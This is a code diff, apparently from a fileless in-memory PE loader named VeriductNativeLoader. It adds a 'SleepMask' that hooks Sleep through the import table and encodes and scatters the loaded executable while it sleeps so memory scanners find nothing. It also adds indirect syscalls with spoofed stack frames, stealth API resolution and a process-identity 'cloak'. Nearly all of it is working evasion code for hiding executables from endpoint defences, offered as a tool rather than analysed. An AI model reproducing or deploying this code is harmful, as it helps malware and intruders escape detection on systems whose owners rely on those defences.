+        # Try indirect syscall first, then standard resolution
+        if self._syscall_eng:
+            # Manually extract SSN for NtDelayExecution if not already cached
+            nt_delay_addr = resolver.get_proc_address("ntdll.dll", "NtDelayExecution")
+            if nt_delay_addr:
+                ssn = self._syscall_eng._read_ssn_from_stub(nt_delay_addr)
+                if ssn is not None and "NtDelayExecution" not in self._syscall_eng._ssn_cache:
+                    self._syscall_eng._ssn_cache["NtDelayExecution"] = ssn
+                    logging.debug(f"SleepMask: Registered NtDelayExecution SSN=0x{ssn:04X}")
+
+    # ------------------------------------------------------------------
+    # IAT Hook Callbacks
+    # ------------------------------------------------------------------
+
+    def create_sleep_hook(self):
+        """
+        Create a ctypes callback for Sleep() IAT hook.
+
+        Returns the callback's address (int) for writing into the IAT.
+        The callback object is stored on self to prevent garbage collection.
+
+        Signature: void WINAPI Sleep(DWORD dwMilliseconds)
+        """
+        @ctypes.WINFUNCTYPE(None, ctypes.c_ulong)
+        def _sleep_hook(dw_milliseconds):
+            self._mask_sleep_unmask(dw_milliseconds)
+
+        self._sleep_callback = _sleep_hook
+        _pinned_callbacks.append(self._sleep_callback)  # FIX 2: prevent GC
+        addr = ctypes.cast(self._sleep_callback, ctypes.c_void_p).value
+        logging.info(f"SleepMask: Sleep hook callback @ 0x{addr:X}")
+        return addr
+
+    def create_sleep_ex_hook(self):
+        """
+        Create a ctypes callback for SleepEx() IAT hook.
+
+        Signature: DWORD WINAPI SleepEx(DWORD dwMilliseconds, BOOL bAlertable)
+        """
+        @ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_ulong, ctypes.c_int)
+        def _sleep_ex_hook(dw_milliseconds, b_alertable):
+            self._mask_sleep_unmask(dw_milliseconds)
+            return 0  # WAIT_OBJECT_0
+
+        self._sleep_ex_callback = _sleep_ex_hook
+        _pinned_callbacks.append(self._sleep_ex_callback)  # FIX 2: prevent GC
+        addr = ctypes.cast(self._sleep_ex_callback, ctypes.c_void_p).value
+        logging.info(f"SleepMask: SleepEx hook callback @ 0x{addr:X}")
+        return addr
+
+    # ------------------------------------------------------------------
+    # Core Mask / Unmask Cycle
+    # ------------------------------------------------------------------
+
+    def _mask_sleep_unmask(self, sleep_ms: int):
+        """
+        Full mask cycle: capture -> shatter -> free -> sleep -> reconstruct.
+
+        Runs in the PE's thread context (called via IAT hook).
+        The PE's thread stack is a separate allocation and survives.
+        """
+        if sleep_ms == 0:
+            # Zero-length sleep — no point masking, just yield
+            return
+
+        self._mask_count += 1
+        cycle_id = self._mask_count
+
+        logging.debug(f"SleepMask: Cycle {cycle_id} — masking for {sleep_ms}ms")
+
+        try:
+            # === PHASE 1: Capture PE image ===
+            image_snapshot = self._capture_image()
+            if not image_snapshot:
+                logging.warning(f"SleepMask: Capture failed, sleeping unmasked")
+                self._raw_sleep(sleep_ms)
+                return
+
+            # === PHASE 2: Shatter + Entangle + Scatter into Python heap ===
+            self._scatter(image_snapshot)
+            del image_snapshot  # Free the contiguous copy immediately
+
+            # === PHASE 3: Free the PE image region ===
+            if not self._free_pe_region():
+                logging.warning(f"SleepMask: Free failed, reconstructing immediately")
+                self._reconstruct()
+                self._raw_sleep(sleep_ms)
+                return
+
+            self._masked = True
+            logging.debug(f"SleepMask: PE annihilated — {len(self._scattered_chunks)} chunks in Python heap")
+
+            # === PHASE 4: Sleep ===
+            # PE memory does not exist during this window.
+            # Chunks are Python objects — indistinguishable from app data.
+            self._raw_sleep(sleep_ms)
+
+            # === PHASE 5: Reconstruct ===
+            if not self._reconstruct():
+                # CRITICAL: Reconstruction failed — PE cannot resume.
+                # This is catastrophic. Log and let the thread crash cleanly.
+                logging.error(f"SleepMask: CRITICAL — reconstruction failed, PE will crash")
+                self._masked = False
+                return
+
+            self._masked = False
+            logging.debug(f"SleepMask: Cycle {cycle_id} — PE restored, resuming")
+
+        except Exception as e:
+            logging.error(f"SleepMask: Cycle {cycle_id} error — {e}")
+            # Try to recover if we're in masked state
+            if self._masked and self._scattered_chunks:
+                try:
+                    self._reconstruct()
+                    self._masked = False
+                except Exception:
+                    logging.error(f"SleepMask: Recovery failed — PE will crash")
+
+    # ------------------------------------------------------------------
+    # Phase 1: Image Capture
+    # ------------------------------------------------------------------
+
+    def _capture_image(self) -> Optional[bytes]:
+        """
+        Read the entire PE image from memory into a Python bytes object.
+
+        This captures the live state: relocated addresses, filled IAT,
+        modified .data sections, etc.
+        """
+        try:
+            snapshot = ctypes.string_at(self.pe_base, self.pe_size)
+            logging.debug(f"SleepMask: Captured {len(snapshot)} bytes from 0x{self.pe_base:X}")
+            return snapshot
+        except OSError as e:
+            logging.error(f"SleepMask: Failed to read PE image: {e}")
+            return None
+
+    # ------------------------------------------------------------------
+    # Phase 2: Scatter (SSM + Entangle + Chunk)
+    # ------------------------------------------------------------------
+
+    def _scatter(self, image_data: bytes):
+        """
+        Split the PE image into chunks, apply SSM and entanglement,
+        store as Python objects in managed heap.
+        """
+        # Split into chunks
+        raw_chunks = []
+        for i in range(0, len(image_data), self.chunk_size):
+            raw_chunks.append(image_data[i:i + self.chunk_size])
+
+        # Apply Semantic Shatter Mapping
+        ssm_seeds = []
+        ssm_inserts = []
+        shattered_chunks = []
+        for chunk in raw_chunks:
+            shattered, seed, inserts = semantic_shatter(
+                chunk, null_insert_rate=self.ssm_null_rate
+            )
+            shattered_chunks.append(shattered)
+            ssm_seeds.append(seed)
+            ssm_inserts.append(inserts)
+
+        # Apply XOR Entanglement
+        entangled, entanglement_info = entangle_chunks(
+            shattered_chunks, self.entanglement_groups
+        )
+
+        # Store everything as Python objects (lives in managed heap)
+        self._scattered_chunks = entangled
+        self._ssm_seeds = ssm_seeds
+        self._ssm_inserts = ssm_inserts
+        self._entanglement_info = entanglement_info
+
+        logging.debug(
+            f"SleepMask: Scattered into {len(entangled)} chunks, "
+            f"{len(entanglement_info.get('groups', []))} entanglement groups"
+        )
+
+    # ------------------------------------------------------------------
+    # Phase 3: Free PE Region
+    # ------------------------------------------------------------------
+
+    def _free_pe_region(self) -> bool:
+        """
+        Decommit the PE image memory region (FIX 4, v2.3).
+
+        Uses MEM_DECOMMIT instead of MEM_RELEASE.  MEM_RELEASE frees the
+        entire VA range back to the OS — during sleep, Python's GC, the OS
+        thread pool, or any background allocation can claim that range,
+        making re-allocation at the same base impossible.
+
+        MEM_DECOMMIT releases the physical pages (nothing for memory scanners
+        to find) but keeps the virtual address range reserved.  Re-committing
+        on wake via VirtualAlloc(MEM_COMMIT) is guaranteed to succeed because
+        we still own the reservation.
+
+        NtFreeVirtualMemory: size must be non-zero for MEM_DECOMMIT (unlike
+        MEM_RELEASE where size must be 0).
+        """
+        MEM_DECOMMIT = 0x4000
+
+        if self._syscall_eng:
+            success = self._syscall_eng.nt_free(self.pe_base, self.pe_size, MEM_DECOMMIT)
+            if success:
+                logging.debug(f"SleepMask: Decommitted PE region via indirect syscall")
+                return True
+            logging.debug("SleepMask: Indirect syscall decommit failed, trying fallback")
+
+        if self._VirtualFree:
+            result = self._VirtualFree(self.pe_base, self.pe_size, MEM_DECOMMIT)
+            if result:
+                logging.debug(f"SleepMask: Decommitted PE region via VirtualFree")
+                return True
+
+        logging.error("SleepMask: Failed to decommit PE region")
+        return False
+
+    # ------------------------------------------------------------------
+    # Phase 4: Sleep
+    # ------------------------------------------------------------------
+
+    def _raw_sleep(self, duration_ms: int):
+        """
+        Execute the actual sleep via NtDelayExecution.
+
+        When SyscallEngine is available, this goes through the indirect
+        syscall trampoline with RBP-chain spoofing — the sleeping thread's
+        stack looks like a legitimate ntdll wait.
+
+        NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval)
+        DelayInterval is in 100ns units, negative = relative.
+        """
+        if duration_ms <= 0:
+            return
+
+        # Convert ms to 100ns intervals (negative = relative)
+        delay_100ns = ctypes.c_longlong(-duration_ms * 10000)
+
+        if self._syscall_eng:
+            fn = self._syscall_eng.get_syscall_func(
+                "NtDelayExecution",
+                ctypes.c_long,      # NTSTATUS
+                ctypes.c_int,       # Alertable (BOOLEAN)
+                ctypes.c_void_p,    # DelayInterval (PLARGE_INTEGER)
+            )
+            if fn:
+                fn(ctypes.c_int(0), ctypes.byref(delay_100ns))
+                return
+
+        # Fallback: resolve NtDelayExecution via stealth (still in ntdll, but
+        # goes through the function prologue — may hit hooks)
+        resolver = get_stealth_resolver()
+        delay_addr = resolver.get_proc_address("ntdll.dll", "NtDelayExecution")
+        if delay_addr:
+            NtDelayExecution = ctypes.WINFUNCTYPE(
+                ctypes.c_long, ctypes.c_int, ctypes.c_void_p
+            )(delay_addr)
+            NtDelayExecution(ctypes.c_int(0), ctypes.byref(delay_100ns))
+            return
+
+        # Last resort: Python time.sleep (breaks stealth but keeps functionality)
+        import time
+        time.sleep(duration_ms / 1000.0)
+
+    # ------------------------------------------------------------------
+    # Phase 5: Reconstruct
+    # ------------------------------------------------------------------
+
+    def _reconstruct(self) -> bool:
+        """
+        Re-allocate PE at the same base address, reverse transforms,
+        copy image back, re-apply section protections.
+
+        Returns True on success, False on critical failure.
+        """
+        if not self._scattered_chunks:
+            logging.error("SleepMask: No chunks to reconstruct from")
+            return False
+
+        # --- Step 1: Reverse transforms ---
+        try:
+            # Disentangle
+            chunks = disentangle_chunks(self._scattered_chunks, self._entanglement_info)
+
+            # Unshatter
+            plain_chunks = []
+            for i, chunk in enumerate(chunks):
+                if i < len(self._ssm_seeds) and self._ssm_seeds[i]:
+                    plain = semantic_unshatter(chunk, self._ssm_seeds[i], self._ssm_inserts[i])
+                    plain_chunks.append(plain)
+                else:
+                    plain_chunks.append(chunk)
+
+            image_data = b''.join(plain_chunks)
+        except Exception as e:
+            logging.error(f"SleepMask: Transform reversal failed: {e}")
+            return False
+
+        if len(image_data) != self.pe_size:
+            logging.warning(
+                f"SleepMask: Reconstructed size mismatch "
+                f"({len(image_data)} vs {self.pe_size}), padding/truncating"
+            )
+            if len(image_data) < self.pe_size:
+                image_data += b'\x00' * (self.pe_size - len(image_data))
+            else:
+                image_data = image_data[:self.pe_size]
+
+        # --- Step 2: Re-commit at the same base (FIX 4, v2.3) ---
+        # We used MEM_DECOMMIT (not MEM_RELEASE), so the VA reservation is
+        # still ours.  MEM_COMMIT alone re-backs the pages with physical memory.
+        # This cannot fail due to address contention — the range is reserved.
+        MEM_COMMIT = 0x1000
+        base_addr = 0
+
+        if self._syscall_eng:
+            base_addr = self._syscall_eng.nt_alloc(
+                self.pe_base, self.pe_size, MEM_COMMIT, PAGE_READWRITE
+            )
+
+        if not base_addr and self._VirtualAlloc:
+            result = self._VirtualAlloc(
+                self.pe_base, self.pe_size, MEM_COMMIT, PAGE_READWRITE
+            )
+            if result:
+                base_addr = result if isinstance(result, int) else ctypes.cast(result, ctypes.c_void_p).value
+
+        if not base_addr:
+            logging.error(
+                f"SleepMask: CRITICAL — failed to re-commit at 0x{self.pe_base:X}. "
+                f"This should not happen with MEM_DECOMMIT strategy."
+            )
+            return False
+
+        if base_addr != self.pe_base:
+            logging.error(
+                f"SleepMask: CRITICAL — re-committed at 0x{base_addr:X}, "
+                f"needed 0x{self.pe_base:X}. Cannot safely resume."
+            )
+            if self._syscall_eng:
+                self._syscall_eng.nt_free(base_addr)
+            elif self._VirtualFree:
+                self._VirtualFree(base_addr, 0, 0x8000)
+            return False
+
+        # --- Step 3: Copy image back ---
+        try:
+            ctypes.memmove(self.pe_base, image_data, len(image_data))
+        except Exception as e:
+            logging.error(f"SleepMask: Failed to write image: {e}")
+            return False
+
+        # --- Step 4: Re-apply section protections ---
+        for section in self.sections:
+            protection = self._translate_section_protection(section['char'])
+            if protection == PAGE_NOACCESS:
+                continue
+
+            if self._syscall_eng:
+                success, _ = self._syscall_eng.nt_protect(
+                    section['addr'], section['size'], protection
+                )
+                if not success and self._VirtualProtect:
+                    old = ctypes.c_ulong()
+                    self._VirtualProtect(
+                        section['addr'], section['size'],
+                        protection, ctypes.byref(old)
+                    )
+            elif self._VirtualProtect:
+                old = ctypes.c_ulong()
+                self._VirtualProtect(
+                    section['addr'], section['size'],
+                    protection, ctypes.byref(old)
+                )
+
+        # --- Step 5: Clear scatter state ---
+        self._scattered_chunks = None
+        self._ssm_seeds = None
+        self._ssm_inserts = None
+        self._entanglement_info = None
+
+        logging.debug(f"SleepMask: PE restored at 0x{self.pe_base:X}")
+        return True
+
+    # ------------------------------------------------------------------
+    # Helpers
+    # ------------------------------------------------------------------
+
+    @staticmethod
+    def _translate_section_protection(characteristics):
+        """Map PE section characteristics to page protection constants."""
+        can_exec = bool(characteristics & IMAGE_SCN_MEM_EXECUTE)
+        can_read = bool(characteristics & IMAGE_SCN_MEM_READ)
+        can_write = bool(characteristics & IMAGE_SCN_MEM_WRITE)
+
+        if can_exec:
+            if can_read and can_write:
+                return PAGE_EXECUTE_READWRITE
+            if can_read:
+                return PAGE_EXECUTE_READ
+            if can_write:
+                return PAGE_EXECUTE_READWRITE
+            return PAGE_EXECUTE
+        if can_read and can_write:
+            return PAGE_READWRITE
+        if can_read:
+            return PAGE_READONLY
+        if can_write:
+            return PAGE_READWRITE
+        return PAGE_NOACCESS
+
+
+
 class MemorySubstrate:
     """
     In-memory filesystem for fileless execution.
@@ -1235,8 +2287,20 @@ def entangle_chunks(chunks: List[bytes], group_size: int = 3) -> Tuple[List[byte
         original_lengths = [len(x) for x in originals]
         maxlen = max(original_lengths)
 
-        padding_byte = 0xFF
-        padded = [bytearray(x.ljust(maxlen, bytes([padding_byte]))) for x in originals]
+        # FIX 10 (v2.5): Seed-derived random padding instead of constant 0xFF.
+        # Constant padding creates byte-frequency artifacts in stored chunks.
+        # The seed is derived from the group's content so padding is deterministic
+        # and reproducible during disentanglement.
+        padding_seed = hashlib.sha256(b''.join(originals)).digest()[:8]
+        padding_rng = random.Random(int.from_bytes(padding_seed, 'big'))
+        def _random_pad(data, target_len):
+            pad_len = target_len - len(data)
+            if pad_len <= 0:
+                return bytearray(data)
+            pad = bytearray(padding_rng.getrandbits(8) for _ in range(pad_len))
+            return bytearray(data) + pad
+        padded = [_random_pad(x, maxlen) for x in originals]
+        padding_byte = None  # No longer a single byte; padding is random
 
         # Build cumulative XOR prefix
         prefix = []
@@ -1255,7 +2319,7 @@ def entangle_chunks(chunks: List[bytes], group_size: int = 3) -> Tuple[List[byte
             "idxs": idxs,
             "maxlen": maxlen,
             "original_lengths": original_lengths,
-            "padding_byte": padding_byte
+            "padding_seed": base64.b64encode(padding_seed).decode('ascii'),  # FIX 10
         })
 
     return entangled, info
@@ -1272,16 +2336,23 @@ def disentangle_chunks(entangled: List[bytes], info: Dict) -> List[bytes]:
         idxs = g["idxs"]
         maxlen = g["maxlen"]
         original_lengths = g["original_lengths"]
-        padding_byte = g.get("padding_byte", 0xFF)
+        # FIX 10 (v2.5): Reconstruct padding from seed for proper reversal.
+        # Legacy groups with "padding_byte" still work (backwards compat).
+        padding_seed_b64 = g.get("padding_seed")
+        padding_byte = g.get("padding_byte", 0xFF)  # legacy fallback
 
         # Entangled chunks should already be at maxlen
-        # If not (legacy data), pad them - but this may cause corruption
         prefix = []
         for i, idx in enumerate(idxs):
             chunk = out[idx]
             if len(chunk) < maxlen:
-                logging.warning(f"Entangled chunk {idx} is {len(chunk)} bytes, expected {maxlen} - padding (may cause corruption)")
-            padded_chunk = bytearray(chunk.ljust(maxlen, bytes([padding_byte])))
+                logging.warning(f"Entangled chunk {idx} is {len(chunk)} bytes, expected {maxlen} - padding")
+            if padding_seed_b64:
+                # New-style: chunks stored at maxlen, no padding needed here
+                padded_chunk = bytearray(chunk[:maxlen].ljust(maxlen, b'\x00'))
+            else:
+                # Legacy: constant padding byte
+                padded_chunk = bytearray(chunk.ljust(maxlen, bytes([padding_byte])))
             prefix.append(padded_chunk)
 
         # Reverse the XOR chain
@@ -1581,278 +2652,373 @@ class VeriductNativeLoader:
             self.is_valid = False
 
     def _execute_pe_windows(self):
-            """Execute PE on Windows with proper memory mapping. Uses stealth API resolution."""
-            resolver = get_stealth_resolver()
-            
-            # Resolve all kernel32 functions we need via stealth
-            VirtualAlloc_addr = resolver.get_proc_address("kernel32.dll", "VirtualAlloc")
-            VirtualProtect_addr = resolver.get_proc_address("kernel32.dll", "VirtualProtect")
-            VirtualFree_addr = resolver.get_proc_address("kernel32.dll", "VirtualFree")
-            CreateThread_addr = resolver.get_proc_address("kernel32.dll", "CreateThread")
-            WaitForSingleObject_addr = resolver.get_proc_address("kernel32.dll", "WaitForSingleObject")
-            GetExitCodeThread_addr = resolver.get_proc_address("kernel32.dll", "GetExitCodeThread")
-            CloseHandle_addr = resolver.get_proc_address("kernel32.dll", "CloseHandle")
-            
-            if not all([VirtualAlloc_addr, VirtualProtect_addr, VirtualFree_addr]):
-                raise RuntimeError("Failed to resolve required kernel32 functions via stealth resolver")
-            
-            # Create callable function pointers using WINFUNCTYPE for Windows API calling convention
-            # Note: BOOL is c_int (4 bytes), not c_bool (1 byte)
-            VirtualAlloc = ctypes.WINFUNCTYPE(
-                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong
-            )(VirtualAlloc_addr)
-            
-            VirtualProtect = ctypes.WINFUNCTYPE(
-                ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
-            )(VirtualProtect_addr)
-            
-            VirtualFree = ctypes.WINFUNCTYPE(
-                ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong
-            )(VirtualFree_addr)
-            
-            CreateThread = ctypes.WINFUNCTYPE(
-                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p,
-                ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
-            )(CreateThread_addr) if CreateThread_addr else None
-            
-            WaitForSingleObject = ctypes.WINFUNCTYPE(
-                ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong
-            )(WaitForSingleObject_addr) if WaitForSingleObject_addr else None
-            
-            GetExitCodeThread = ctypes.WINFUNCTYPE(
-                ctypes.c_int, ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong)
-            )(GetExitCodeThread_addr) if GetExitCodeThread_addr else None
-            
-            CloseHandle = ctypes.WINFUNCTYPE(
-                ctypes.c_int, ctypes.c_void_p
-            )(CloseHandle_addr) if CloseHandle_addr else None
-    
-            # Allocate memory - let Windows choose the address
-            base_addr = VirtualAlloc(
-                None,  # Let Windows choose address
+        """
+        Execute PE on Windows with proper memory mapping.
+        
+        Uses SyscallEngine for indirect syscalls + RBP-chain stack spoofing
+        when available, with transparent fallback to standard stealth-resolved
+        API calls.
+        
+        Indirect syscall path:
+          Memory ops   -> NtAllocateVirtualMemory / NtProtectVirtualMemory / NtFreeVirtualMemory
+          Thread ops   -> NtCreateThreadEx / NtWaitForSingleObject / NtClose
+          All routed through ntdll syscall;ret gadgets with spoofed RBP frame chains
+        
+        Fallback path (original):
+          Memory ops   -> kernel32!VirtualAlloc / VirtualProtect / VirtualFree
+          Thread ops   -> kernel32!CreateThread / WaitForSingleObject / CloseHandle
+          Resolved via StealthResolver (PEB walk + export table parsing)
+        """
+        resolver = get_stealth_resolver()
+        
+        # --- Try to initialize indirect syscall engine ---
+        syscall_eng = None
+        try:
+            syscall_eng = get_syscall_engine()
+            if not syscall_eng.available:
+                syscall_eng = None
+        except Exception as e:
+            logging.debug(f"SyscallEngine not available: {e}")
+            syscall_eng = None
+        
+        if syscall_eng:
+            logging.info("PE Loader: Using INDIRECT SYSCALLS with stack frame spoofing")
+        else:
+            logging.info("PE Loader: Using standard stealth-resolved API calls")
+        
+        # --- Resolve fallback APIs (always needed for non-Nt operations) ---
+        VirtualAlloc_addr = resolver.get_proc_address("kernel32.dll", "VirtualAlloc")
+        VirtualProtect_addr = resolver.get_proc_address("kernel32.dll", "VirtualProtect")
+        VirtualFree_addr = resolver.get_proc_address("kernel32.dll", "VirtualFree")
+        CreateThread_addr = resolver.get_proc_address("kernel32.dll", "CreateThread")
+        WaitForSingleObject_addr = resolver.get_proc_address("kernel32.dll", "WaitForSingleObject")
+        GetExitCodeThread_addr = resolver.get_proc_address("kernel32.dll", "GetExitCodeThread")
+        CloseHandle_addr = resolver.get_proc_address("kernel32.dll", "CloseHandle")
+        
+        if not all([VirtualAlloc_addr, VirtualProtect_addr, VirtualFree_addr]):
+            raise RuntimeError("Failed to resolve required kernel32 functions via stealth resolver")
+        
+        # Build fallback callables (used when syscall engine unavailable or for ops without Nt equivalents)
+        VirtualAlloc = ctypes.WINFUNCTYPE(
+            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong
+        )(VirtualAlloc_addr)
+        
+        VirtualProtect = ctypes.WINFUNCTYPE(
+            ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
+        )(VirtualProtect_addr)
+        
+        VirtualFree = ctypes.WINFUNCTYPE(
+            ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong
+        )(VirtualFree_addr)
+        
+        CreateThread = ctypes.WINFUNCTYPE(
+            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p,
+            ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
+        )(CreateThread_addr) if CreateThread_addr else None
+        
+        WaitForSingleObject = ctypes.WINFUNCTYPE(
+            ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong
+        )(WaitForSingleObject_addr) if WaitForSingleObject_addr else None
+        
+        GetExitCodeThread = ctypes.WINFUNCTYPE(
+            ctypes.c_int, ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong)
+        )(GetExitCodeThread_addr) if GetExitCodeThread_addr else None
+        
+        CloseHandle = ctypes.WINFUNCTYPE(
+            ctypes.c_int, ctypes.c_void_p
+        )(CloseHandle_addr) if CloseHandle_addr else None
+
+        # ==============================================================
+        # ALLOCATE IMAGE MEMORY
+        # ==============================================================
+        if syscall_eng:
+            base_addr_int = syscall_eng.nt_alloc(
+                0,                    # Let OS choose address (NULL -> 0)
                 self.size_of_image,
-                0x3000,  # MEM_COMMIT | MEM_RESERVE
+                0x3000,               # MEM_COMMIT | MEM_RESERVE
                 PAGE_READWRITE
             )
-    
+            if not base_addr_int:
+                logging.warning("Indirect syscall alloc failed, falling back to VirtualAlloc")
+                syscall_eng = None  # Disable for rest of execution
+        
+        if not syscall_eng or not base_addr_int:
+            base_addr = VirtualAlloc(
+                None,
+                self.size_of_image,
+                0x3000,
+                PAGE_READWRITE
+            )
             if not base_addr:
                 error = ctypes.get_last_error()
                 raise RuntimeError(f"VirtualAlloc failed with error {error}")
-    
             base_addr_int = base_addr if isinstance(base_addr, int) else ctypes.cast(base_addr, ctypes.c_void_p).value
-            logging.info(f"Allocated {self.size_of_image} bytes at 0x{base_addr_int:X}")
 
-            # Initialize CRT helper with command line
-            crt_init = CRTInitializer(base_addr_int, self.stream, self.is_64bit, 
-                                    self.load_config_rva, self.load_config_size,
-                                    command_line=self.command_line)
-    
-            try:
-                sections_to_protect = []
-                header_size = 0x1000
-        
-                # Copy headers
-                ctypes.memmove(base_addr, bytes(self.stream[:header_size]), min(len(self.stream), header_size))
-        
-                # Map sections
-                current_offset = self.section_header_offset
-                for i in range(self.num_sections):
-                    v_addr = struct.unpack('<I', self.stream[current_offset+12:current_offset+16])[0]
-                    raw_size = struct.unpack('<I', self.stream[current_offset+16:current_offset+20])[0]
-                    raw_ptr = struct.unpack('<I', self.stream[current_offset+20:current_offset+24])[0]
-                    characteristics = struct.unpack('<I', self.stream[current_offset+36:current_offset+40])[0]
-            
-                    if raw_size > 0 and v_addr > 0:
-                        # BOUNDS CHECK: Ensure section fits within allocated image
-                        if v_addr + raw_size > self.size_of_image:
-                            raise ValueError(f"Section {i} extends beyond image bounds (v_addr=0x{v_addr:X}, raw_size=0x{raw_size:X}, image_size=0x{self.size_of_image:X})")
-                        
-                        # BOUNDS CHECK: Ensure we have enough source data
-                        if raw_ptr + raw_size > len(self.stream):
-                            logging.warning(f"Section {i} raw data truncated (raw_ptr=0x{raw_ptr:X}, raw_size=0x{raw_size:X}, stream_len=0x{len(self.stream):X})")
-                            raw_size = min(raw_size, len(self.stream) - raw_ptr) if raw_ptr < len(self.stream) else 0
-                        
-                        if raw_size > 0:
-                            dest = base_addr_int + v_addr
-                            data = self.stream[raw_ptr:raw_ptr + raw_size]
-                            ctypes.memmove(dest, bytes(data), len(data))
-                            logging.debug(f"Mapped section {i} at RVA 0x{v_addr:X} ({raw_size} bytes)")
-                
-                            sections_to_protect.append({
-                                'addr': dest,
-                                'size': raw_size,
-                                'char': characteristics
-                            })
-            
-                    current_offset += 40
-        
-                # Apply relocations if needed
-                delta = base_addr_int - self.image_base
-                if delta != 0 and self.reloc_table_rva != 0:
-                    logging.info(f"Applying relocations (delta: 0x{delta:X})")
-                    self._apply_pe_relocations(base_addr_int, self.reloc_table_rva, self.reloc_table_size, delta)
-        
-                # Resolve imports
-                if self.import_table_rva != 0:
-                    logging.info("Resolving imports...")
-                    self._resolve_pe_imports(base_addr_int, self.import_table_rva)
-                
-                # Resolve delay-load imports
-                self._resolve_pe_delay_imports(base_addr_int)
-                
-                # Execute TLS Callbacks
-                self._execute_tls_callbacks(base_addr_int)
+        logging.info(f"Allocated {self.size_of_image} bytes at 0x{base_addr_int:X}"
+                     f"{' [indirect syscall]' if syscall_eng else ''}")
 
-                # Setup SEH
-                self._setup_seh(base_addr_int)
-        
-                # CRT Initialization (while memory is still RW)
-                crt_init.initialize()
+        # Initialize CRT helper with command line
+        crt_init = CRTInitializer(base_addr_int, self.stream, self.is_64bit,
+                                  self.load_config_rva, self.load_config_size,
+                                  command_line=self.command_line)
 
-                # Identity Cloak (optional runtime masquerade)
-                identity_cloak = None
-                if self.cloak_preset or self.cloak_custom:
-                    identity_cloak = IdentityCloak(
-                        target_name=self.cloak_preset if self.cloak_preset != "custom" else None,
-                        custom_config=self.cloak_custom
+        try:
+            sections_to_protect = []
+            header_size = 0x1000
+
+            # Copy headers
+            ctypes.memmove(base_addr_int, bytes(self.stream[:header_size]), min(len(self.stream), header_size))
+
+            # Map sections
+            current_offset = self.section_header_offset
+            for i in range(self.num_sections):
+                v_addr = struct.unpack('<I', self.stream[current_offset+12:current_offset+16])[0]
+                raw_size = struct.unpack('<I', self.stream[current_offset+16:current_offset+20])[0]
+                raw_ptr = struct.unpack('<I', self.stream[current_offset+20:current_offset+24])[0]
+                characteristics = struct.unpack('<I', self.stream[current_offset+36:current_offset+40])[0]
+
+                if raw_size > 0 and v_addr > 0:
+                    if v_addr + raw_size > self.size_of_image:
+                        raise ValueError(f"Section {i} extends beyond image bounds")
+
+                    if raw_ptr + raw_size > len(self.stream):
+                        logging.warning(f"Section {i} raw data truncated")
+                        raw_size = min(raw_size, len(self.stream) - raw_ptr) if raw_ptr < len(self.stream) else 0
+
+                    if raw_size > 0:
+                        dest = base_addr_int + v_addr
+                        data = self.stream[raw_ptr:raw_ptr + raw_size]
+                        ctypes.memmove(dest, bytes(data), len(data))
+                        logging.debug(f"Mapped section {i} at RVA 0x{v_addr:X} ({raw_size} bytes)")
+
+                        sections_to_protect.append({
+                            'addr': dest,
+                            'size': raw_size,
+                            'char': characteristics
+                        })
+
+                current_offset += 40
+
+            # Apply relocations if needed
+            delta = base_addr_int - self.image_base
+            if delta != 0 and self.reloc_table_rva != 0:
+                logging.info(f"Applying relocations (delta: 0x{delta:X})")
+                self._apply_pe_relocations(base_addr_int, self.reloc_table_rva, self.reloc_table_size, delta)
+
+            # Resolve imports
+            if self.import_table_rva != 0:
+                logging.info("Resolving imports...")
+                # Create SleepMask for annihilation-based sleep masking
+                sleep_mask = None
+                try:
+                    sleep_mask = SleepMask(
+                        pe_base=base_addr_int,
+                        pe_size=self.size_of_image,
+                        sections=sections_to_protect,
+                        is_64bit=self.is_64bit,
                     )
-                    identity_cloak.apply()
+                    # FIX 2: Pin to module-level list.  If the PE spawns
+                    # background threads that call Sleep() after the main
+                    # thread exits, the SleepMask (and its ctypes callbacks)
+                    # must not be garbage-collected.
+                    _pinned_callbacks.append(sleep_mask)
+                except Exception as e:
+                    logging.debug(f"SleepMask init failed (non-critical): {e}")
                 
-                # NOW apply final section protections (two-pass: was RW, now set proper perms)
-                # This happens AFTER all writes are complete (imports resolved, relocations applied, CRT init done)
-                logging.debug("Applying final section protections...")
-                for section in sections_to_protect:
-                    protection = self._translate_pe_section_protection(section['char'])
-                    old_protect = ctypes.c_ulong()
-                    
-                    # No RWX fallback - apply proper permissions
-                    # .text -> PAGE_EXECUTE_READ (not RWX)
-                    # .rdata -> PAGE_READONLY
-                    # .data -> PAGE_READWRITE
-                    if protection != PAGE_NOACCESS:
+                self._resolve_pe_imports(base_addr_int, self.import_table_rva, sleep_mask=sleep_mask)
+
+            # Resolve delay-load imports
+            self._resolve_pe_delay_imports(base_addr_int)
+
+            # Execute TLS Callbacks
+            self._execute_tls_callbacks(base_addr_int)
+
+            # Setup SEH
+            self._setup_seh(base_addr_int)
+
+            # CRT Initialization (while memory is still RW)
+            crt_init.initialize()
+
+            # Identity Cloak (optional runtime masquerade)
+            identity_cloak = None
+            if self.cloak_preset or self.cloak_custom:
+                identity_cloak = IdentityCloak(
+                    target_name=self.cloak_preset if self.cloak_preset != "custom" else None,
+                    custom_config=self.cloak_custom
+                )
+                identity_cloak.apply()
+
+            # ==============================================================
+            # APPLY FINAL SECTION PROTECTIONS
+            # ==============================================================
+            logging.debug("Applying final section protections...")
+            for section in sections_to_protect:
+                protection = self._translate_pe_section_protection(section['char'])
+                
